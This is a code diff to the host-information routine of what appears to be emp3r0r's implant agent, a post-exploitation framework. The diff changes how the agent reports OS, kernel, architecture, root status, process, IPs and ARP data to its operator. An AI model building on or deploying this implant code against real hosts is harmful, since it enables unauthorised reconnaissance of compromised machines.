@@ -1,6 +1,3 @@
-//go:build linux
-// +build linux
-
 package agent
 
 import (
@@ -14,7 +11,6 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
-	"runtime"
 	"strings"
 	"time"
 
@@ -82,7 +78,7 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	var info emp3r0r_data.SystemInfo
 	osinfo := GetOSInfo()
 
-	info.OS = fmt.Sprintf("%s %s (%s)", osinfo.Name, osinfo.Version, osinfo.Architecture)
+	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
 	hostname, err := os.Hostname()
 	if err != nil {
 		log.Printf("Gethostname: %v", err)
@@ -92,8 +88,8 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	info.Tag = RuntimeConfig.AgentTag // use hostid
 	info.Hostname = hostname
 	info.Version = emp3r0r_data.Version
-	info.Kernel = util.GetKernelVersion()
-	info.Arch = runtime.GOARCH
+	info.Kernel = osinfo.Kernel
+	info.Arch = osinfo.Architecture
 	info.CPU = util.GetCPUInfo()
 	info.GPU = util.GetGPUInfo()
 	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
@@ -102,7 +98,7 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	info.Transport = emp3r0r_data.Transport
 
 	// have root?
-	info.HasRoot = os.Geteuid() == 0
+	info.HasRoot = HasRoot()
 
 	// process
 	info.Process = CheckAgentProcess()
@@ -125,7 +121,7 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	info.IPs = tun.IPa()
 
 	// arp -a ?
-	info.ARP = IPNeigh()
+	info.ARP = nil
 
 	return &info
 }
